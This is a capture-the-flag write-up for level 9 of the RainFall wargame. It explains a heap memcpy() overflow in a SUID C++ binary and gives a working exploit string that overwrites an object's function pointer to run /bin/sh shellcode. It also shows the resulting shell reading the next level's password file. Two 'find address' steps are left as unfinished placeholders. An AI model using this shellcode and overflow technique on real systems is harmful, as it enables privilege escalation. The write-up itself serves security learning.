# Level 9

## Vulnerability

```memcpy()``` buffer overflow

## Context

We find a binary with owner bonus0 and SUID.
```
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```
When run, it does nothing.
```
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 hi
level9@RainFall:~$ ./level9 oh hi
level9@RainFall:~$
```

## Solution

Giving one long argument causes a segfault. We find the maximum input is 108 characters before segfaulting.
```
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 108')
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 109')
Segmentation fault (core dumped)
```

Investigating with gdb, we find this binary is compiled from C++ source code. 5 functions of class ```N``` stand out.
```
(gdb) info functions
...
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
...
```
Globally, ```main()``` initializes two instances (```a``` & ```b```) of class ```N``` which contain:
1. a number (int)
2. a function pointer
3. an annotation (string)

Then ```main()``` calls ```setAnnotation()``` which calls ```memcpy()```, copying ```argv[1]``` into a buffer ```a->annotation```. ```memcpy()``` copies strlen(argv[1]) bytes, meaning we can easily overflow the buffer.

Finally ```main()``` executes the function ```b->func```.

Can we simply (like previous levels) write our [malicious code which opens a shell](http://shell-storm.org/shellcode/files/shellcode-827.php) in buffer ```a->annotation```, then overwrite EIP with the address of our malicious code? Unfortunately, using the following example and [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we don't seem to be able to reach and overwrite EIP.
```
(gdb) run Aa0Aa1Aa2Aa3Aa4...
...
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
```
However, because we created ```b``` after ```a``` on the heap, we can use the ```memcpy()``` overflow to overwrite both ```a``` and ```b```. So can we overwrite ```b->func``` with the address of our malicious code in ```a->annotation``` and have ```main()``` call our malicious code for us? Not quite so simple...

```main()``` executes a function dereferenced twice (a pointer to a pointer to a function), so we overwrite ```b->func``` with the address of a pointer to our maicious code.

Find address of buffer ```a->annotation```...!!!!!!!!!!!!!!!!!!!!
Find address of ```b->func```...!!!!!!!!!!!!!!!!!!!!

### Build exploit string

So we build our exploit string:
1. address of malicious code - ```\x10\xa0\x04\x08```
2. malicious code which opens a shell - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80```
3. buffer until we reach ```b->func``` - ```"A" * 76```
4. address of address of malicious code (1.) - ```\x0c\xa0\04\x08```

```
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
